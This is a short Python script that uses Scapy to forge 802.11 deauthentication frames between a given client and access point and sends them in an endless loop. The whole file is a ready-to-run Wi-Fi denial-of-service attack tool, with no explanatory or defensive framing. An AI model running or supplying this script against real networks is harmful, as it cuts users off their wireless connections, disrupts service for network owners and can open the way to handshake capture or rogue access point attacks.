from scapy.all import *
import os
import sys

from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

client = sys.argv[1]
ap = sys.argv[2]
interface = sys.argv[3]

packet_client = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()

packet_ap = RadioTap() / Dot11(addr1=ap, addr2=client, addr3=ap) / Dot11Deauth()

while True:
	for i in range(50):
		print("Sending deauthentication packet from AP to client")
		sendp(packet_client, iface=interface)

		print("Sending deauthentication packet from client to AP")
		sendp(packet_ap, iface=interface)